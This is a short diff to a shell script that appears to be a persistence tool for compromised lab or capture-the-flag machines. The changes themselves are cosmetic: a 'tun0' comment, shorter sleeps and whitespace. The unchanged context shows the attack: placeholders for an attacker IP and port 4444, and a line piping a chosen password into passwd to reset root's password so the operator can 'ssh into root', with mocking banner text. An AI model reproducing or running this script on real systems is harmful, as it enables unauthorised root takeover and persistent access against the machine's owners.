@@ -11,7 +11,7 @@
 
 NAME=Cipher007  #change this
 PASS=seriously!   #change this
-IP=10.10.10.10    #change this
+IP=10.10.10.10    #change this (tun0)
 PORT=4444       #change this
 
 echo "Created by Cipher007"
@@ -30,7 +30,7 @@ echo "There is always something left to learn, even for a MASTER!"
 echo "                                                           ~Master Shifu"
 echo ""
 
-sleep 5
+sleep 2
 
 echo "[*]Changing password of root"
 echo $PASS | passwd $NEW      #changes the root password
@@ -38,7 +38,7 @@ echo "[+] Passowrd changed! LMAO"
 
 echo "The root password has been changed! You can directly ssh into root now!"
 
-sleep 3 
+sleep 3
 
 echo ""
 
